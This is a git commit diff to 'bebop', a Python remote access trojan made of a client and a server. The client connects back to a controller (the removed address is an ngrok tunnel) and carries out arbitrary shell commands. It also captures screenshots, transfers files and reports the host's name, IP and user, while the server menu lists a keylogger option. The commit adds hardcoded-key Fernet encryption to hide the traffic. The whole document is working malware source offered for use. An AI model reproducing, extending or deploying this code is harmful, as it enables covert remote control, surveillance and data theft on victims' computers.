463ff2f8d7331e353aa8a7656fb865e9ab38f37b
dnv19192 <dnv19191@gmail.com>
2021-06-14 19:07:00 -0700

    Alot of clean up...

--- bebop-client.py
+++ bebop-client.py
@@ -3,14 +3,17 @@ import sys
 import os
 import time
 import subprocess
+from cryptography.fernet import Fernet
 import mss
 
 
 
-address = ("2.tcp.ngrok.io", 15546)
+address = ("0.0.0.0", 3001)
+f_key = b'FhnnERujmRY65fVqM0S_LvK26NybEETUlK0_gvV9Dws=' # Insert key from Fernet.generate_key(), must be same as Server
+
 
 def take_screen_shot():
-    if len(mss.mss().monitors) > 0:
+    if mss.mss().monitors:
         raw_pixels = mss.mss().grab(mss.mss().monitors[0])
         img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
         send(img_data)
@@ -18,22 +21,39 @@ def take_screen_shot():
     else:
         send(b'')
 
-def recv(buff_size=1024):
-    data_size = int(server_con.recv(12).decode().rstrip())
+def get_info():
+    description = f"""Client Name: {os.uname().nodename}\nLocal IP: {socket.gethostbyname(os.uname().nodename)}\nUser: {os.getlogin()}\nPassword: {"🤷🏻‍♂️ (Dunno know)"}"""
+    send(description.encode())
 
-    if not data_size:
-        return None
-
+def recv(buff_size=1024, show_status=False):
     data_buff = bytes()
-    while len(data_buff) < data_size:
-        data_buff += server_con.recv(buff_size)
 
-    return data_buff
+    try:
+        data_size = server_con.recv(12)
+        data_size = int(data_size.decode().rstrip())
+
+        if not data_size:
+            return None
+
+        while len(data_buff) < data_size:
+            if show_status:
+                print(f"{len(data_buff/8)}/{data_size/8}KB")
+
+            data_buff += server_con.recv(buff_size)
+
+        
+
+    except:
+        print("Unable to retrieve data.")
+        
+    return lock.decrypt(data_buff)
+
 
 def send(data):
     header_size = 12
-    data_size = f"{len(data):<{header_size}}"
-    server_con.sendall(data_size.encode()+data)
+    encrypted_data = lock.encrypt(data)
+    data_size = f"{len(encrypted_data):<{header_size}}"
+    server_con.sendall(data_size.encode()+encrypted_data)
 
 
 def upload_file(file_name):
@@ -47,7 +67,7 @@ def upload_file(file_name):
         send(b'')
 
 def download_file(file_name, file_path):
-    file_data = recv(buff_size=4096)
+    file_data = recv(buff_size=16384, show_status=True)
     if not file_data:
         print("Could not download file...")
         return
@@ -73,6 +93,7 @@ def open_shell():
 
         if cmd == "exit":
             break
+
         elif cmd[:2] == "cd":
             dir = cmd[3:]
             try:
@@ -96,7 +117,7 @@ def open_shell():
 
         else:
             output = subprocess.Popen(f'{cmd}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-            str_msg = output[0] + output[1]
+            str_msg = output[0] + output[1] 
 
 
 
@@ -106,7 +127,8 @@ def open_shell():
 
 
 def establish_connection(address):
-    global server_con
+    global server_con, lock
+    lock = Fernet(f_key)
 
     print("Connecting...")
     while True:
@@ -114,15 +136,23 @@ def establish_connection(address):
             server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_con.connect((address[0],address[1]))
             print(f"Connected!\nServer: {address[0]}:{address[1]}")
+
+            send(f_key)
+            is_OK = recv().decode()
+            if is_OK == "OK":
+                break
+
         except:
             time.sleep(3)
         else:
             break
 
+def kill_connection():
+    server_con.shutdown(socket.SHUT_WR)
+    server_con.close()
 
 def main():
     establish_connection(address)
-
     while True:
         choice = recv().decode()
         if choice == "1":
@@ -132,7 +162,11 @@ def main():
             take_screen_shot()
         elif choice == "3":
             pass
+
         elif choice == "4":
+            get_info()
+
+        elif choice == "5":
             keep_alive = recv().decode().lower()
             if keep_alive == "y" or keep_alive == "yes":
                 server_con.shutdown(socket.SHUT_WR)
@@ -142,6 +176,7 @@ def main():
             else:
                 break
 
-    server_con.close()
+
+    kill_connection()
 
 main()
--- bebop-server.py
+++ bebop-server.py
@@ -1,37 +1,44 @@
 import socket
 import sys
-import threading
 import time
 import os
-from pynput import keyboard
+from cryptography.fernet import Fernet
 
-from pynput.keyboard import *
-
-address = ("0.0.0.0", 3000)
+address = ("0.0.0.0", 3001)
+f_key = b'FhnnERujmRY65fVqM0S_LvK26NybEETUlK0_gvV9Dws=' # Insert key from Fernet.generate_key(), must be same as client
+script_cwd = os.getcwd()
+device_info = ""
 
 def print_menu():
     print("\n/-------BEBOP-------/\n")
     print("1.) Open shell")
     print("2.) Take screenshot")
     print("3.) Keylogger")
-    print("4.) Exit\n\n")
+    print("4.) Get Device Info")
+    print("5.) Exit\n\n")
+
+def get_info():
+    device_info = recv()
+    print(f"\n\n{device_info.decode()}\n\n")
 
 def recv(buff_size=1024):
-    data_size = int(conn_to_client.recv(12).decode().rstrip())
+    data_buff = bytes()
+    data_size = conn_to_client.recv(12)
+    data_size = int(data_size.decode().rstrip())
 
     if not data_size:
         return None
 
-    data_buff = bytes()
     while len(data_buff) < data_size:
         data_buff += conn_to_client.recv(buff_size)
 
-    return data_buff
+    return lock.decrypt(data_buff)
 
 def send(data):
     header_size = 12
-    data_size = f"{len(data):<{header_size}}"
-    conn_to_client.sendall(data_size.encode()+data)
+    encrypted_data = lock.encrypt(data)
+    data_size = f"{len(encrypted_data):<{header_size}}"
+    conn_to_client.sendall(data_size.encode()+encrypted_data)
 
 
 def upload_file(file_name):
@@ -46,7 +53,7 @@ def upload_file(file_name):
         send(b'')
 
 def download_file(file_name):
-    file_data = recv(buff_size=4096)
+    file_data = recv(buff_size=16384)
     if not file_data:
         print("Could not download file...")
         return
@@ -81,7 +88,7 @@ def open_shell():
 
 
     while True:
-        cmd = input("bebop#: ")
+        cmd = input("\nbebop#: ")
 
         if cmd:
             if cmd == "exit":
@@ -101,58 +108,89 @@ def open_shell():
                 print("Uploading...")
                 send(cmd.encode())
                 file_name = cmd[3:]
+                file_name = file_name.replace(' ', '\ ')
                 upload_file(file_name)
 
             else:
                 send(cmd.encode())
                 output = recv()
 
-                if output:
-                    print(output.decode())
+                try:
+                    output = output.decode() 
 
+                except UnicodeDecodeError:
+                    print("Already in bytes")
+                    
+                finally:
+                    print(output)
+                
 
-            print("\n", end="")
-            shell_history_forward.append(cmd)
+            #shell_history_forward.append(cmd)
 
-    l.stop()
+    #l.stop()
 
 def establish_connection(address):
-    global conn_to_client
+    global conn_to_client, lock
+    lock = Fernet(f_key)
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(address)
     server.listen(0)
 
-    print("Waiting on connections")
-    conn_to_client, address = server.accept()
+    print("[+] Waiting on connections")
+    while True: 
+        conn_to_client, client_addr = server.accept()
+        if conn_to_client:
+            client_key = recv().decode()
+            if client_key != f_key.decode():
+                kill_connection()
+                print("[+] Unable to authenticate. Closing connection...")
+            else:
+                send(b'OK')
+                print(f"[+] Encrypted Connection to {client_addr[0]}:{client_addr[1]} Established!")
+                break
+        else:
+            sys.exit("[+] Failed to recieve connection to client...Exiting")
 
-    if conn_to_client:
-        print(f"Connection to {address[0]}:{address[1]} Established!")
-    else:
-        sys.exit("Failed to recieve connection to client...Exiting")
-
+def kill_connection():
+    conn_to_client.shutdown(socket.SHUT_WR)
+    conn_to_client.close()
 
 def main():
     establish_connection(address)
-    while True:
-        print_menu()
-        choice = input("Enter Choice: ")
-        send(choice.encode())
+    
+    while conn_to_client:
+        try:
+            print_menu()
+            choice = input("Enter Choice: ")
+            send(choice.encode())
 
-        if choice == "1":
-            open_shell()
+            if choice == "1":
+                open_shell()
 
-        elif choice == "2":
-            download_file(file_name=f"{time.asctime()}.png")
+            elif choice == "2":
+                print("\nTaking Screenshot...")
+                download_file(file_name=f"{time.asctime()}.png")
+                print(f"\nScreenshot saved in {script_cwd}/{time.asctime()}.png")
 
-        elif choice == "3":
-            pass
+            elif choice == "3":
+                pass
 
-        elif choice == "4":
-            keep_alive = input("Keep client alive? (Y or N): ")
-            print("Keeping client alive..." if keep_alive.lower() == "y" or keep_alive == "yes" else "Killing client connection...")
-            send(keep_alive.encode())
-            conn_to_client.shutdown(socket.SHUT_WR)
-            conn_to_client.close()
-            sys.exit()
+            elif choice == "4":
+                get_info()
+
+            elif choice == "5":
+                keep_alive = input("[+] Keep client alive? (Y or N): ")
+                print("[+] Keeping client alive..." if keep_alive.lower() == "y" or keep_alive == "yes" else "[+] Killing client connection...")
+                send(keep_alive.encode())
+                break
+
+        except BrokenPipeError as bp:
+            print("Connection lost...")
+            print(bp)
+            break
+            
+        
+    kill_connection()
+
 
 main()
